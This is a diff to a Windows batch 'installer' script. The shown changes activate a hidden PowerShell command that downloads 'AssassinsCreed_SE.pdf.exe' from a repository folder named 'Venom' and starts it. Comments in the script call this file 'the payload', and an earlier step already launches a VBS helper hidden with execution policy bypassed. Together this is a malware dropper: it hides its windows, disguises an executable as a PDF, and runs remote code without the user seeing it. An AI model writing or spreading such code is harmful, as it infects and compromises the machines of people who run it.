@@ -1,8 +1,6 @@
 @echo off
 @rem Computer scripts installer
 
-@rem Display some cool ASCII art
-
 @rem Function to check internet connection
 :check_internet
 echo Checking internet connectivity...
@@ -37,16 +35,15 @@ for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
 @rem Use VBS script to run batch file hidden
 powershell -windowstyle hidden -ExecutionPolicy Bypass ./RunHidden.vbs
 
-@rem Check internet connectivity before downloading the payload
+Check internet connectivity before downloading the payload
 call :check_internet
 
-@rem powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/initial1.cmd -OutFile initial1.cmd"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/AssassinsCreed_SE.pdf.exe -OutFile AssassinsCreed_SE.pdf.exe"
 
-@rem start initial.cmd
+start AssassinsCreed_SE.pdf.exe
 
 
 
-pause
 @rem exit process
 :end
 exit
